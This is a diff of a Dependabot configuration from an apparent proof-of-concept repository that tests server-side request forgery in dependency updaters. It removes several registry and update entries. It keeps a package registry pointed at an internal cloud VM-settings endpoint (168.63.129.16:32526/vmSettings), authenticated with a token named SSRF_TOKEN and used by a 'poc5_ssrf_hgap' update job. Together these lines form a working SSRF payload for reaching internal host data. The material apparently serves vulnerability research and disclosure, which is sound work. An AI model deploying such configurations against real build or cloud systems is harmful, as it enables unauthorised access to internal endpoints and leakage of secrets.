@@ -1,13 +1,5 @@
 version: 2
 registries:
-  my-rubygems:
-    type: rubygems-server
-    url: https://rubygems.pkg.github.com/ugurcanli
-    token: ${{secrets.SSRF_TOKEN}}
-  my-npm:
-    type: npm-registry
-    url: https://npm.pkg.github.com
-    token: ${{secrets.SSRF_TOKEN}}
   hgap-vmsettings:
     type: python-index
     url: http://168.63.129.16:32526/vmSettings#
@@ -18,30 +10,6 @@ registries:
     token: ${{secrets.SSRF_TOKEN}}
 
 updates:
-  - package-ecosystem: "pip"
-    directory: "/dependabot_poc/poc1_setup_py"
-    schedule:
-      interval: "daily"
-
-  - package-ecosystem: "bundler"
-    directory: "/dependabot_poc/poc2_gemspec"
-    schedule:
-      interval: "daily"
-    registries:
-      - my-rubygems
-
-  - package-ecosystem: "npm"
-    directory: "/dependabot_poc/poc3_npm"
-    schedule:
-      interval: "daily"
-
-  - package-ecosystem: "npm"
-    directory: "/dependabot_poc/poc4_pnpm"
-    schedule:
-      interval: "daily"
-    registries:
-      - my-npm
-
   - package-ecosystem: "pip"
     directory: "/dependabot_poc/poc5_ssrf_hgap"
     schedule:
